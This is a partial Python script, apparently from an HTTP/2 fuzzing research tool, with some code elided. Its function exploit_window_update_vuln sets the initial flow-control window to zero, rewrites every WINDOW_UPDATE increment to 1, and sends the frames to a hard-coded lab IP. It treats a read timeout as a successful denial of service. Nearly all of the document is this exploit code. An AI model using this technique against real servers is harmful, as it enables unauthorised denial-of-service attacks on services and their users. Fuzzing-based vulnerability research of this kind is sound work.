def open_socket(self, dst_ip):
	# ... some code
	s.settimeout(6)
	# ... some code


def fuzzing_run(self):
	# ... some code
	# traverse each state transition
	print('\nTransition: ', t_key)
	self.exploit_window_update_vuln(self.get_moving_frame(t_key), t_msg, self.open_socket(dst_ip='192.168.56.109'))
	# ...some code

	
def exploit_window_update_vuln(self, moving_messages, t_msg, sockBuf):
	prefaceFrame, firstSETTINGS = self.initframe_setting()
	init_msg = h2.H2Seq()
	own_set = h2.H2Frame() / h2.H2SettingsFrame()
	own_set.settings = [
		h2.H2Setting(id=h2.H2Setting.SETTINGS_INITIAL_WINDOW_SIZE, value=0)
	]
	init_msg.frames = [prefaceFrame, own_set]

	moving_messages.insert(0, init_msg)
	moving_messages.append(t_msg)
	#print("# of messages: ", len(moving_messages))

	try:
		for msg in moving_messages:
			for frm in msg.frames:

				# PREFACE
				if frm.name == 'Raw': 
					continue
					
				# WINDOW UPDATE
				if frm.type == h2.H2WindowUpdateFrame.type_id:
					print("WINDOW UPDATE. Changing Window Size Increment from ", frm.win_size_incr, " to 1")
					frm.win_size_incr = 1

		# Send the messages
		for msg in moving_messages:
			sockBuf.send(msg)


		while True:
			received_packet = sockBuf.recv()
			#print("\nReceived packet")
			#print(received_packet.show())
	except Exception as e:
		print(e)
		if str(e) == 'The read operation timed out':
			print("DDDDDDDDDDDDDDDDDDDDDDooooooooooooooooooooooooooooooooooSSSSSSSSSSSSSSSSSSSSSSSSSSSSS")


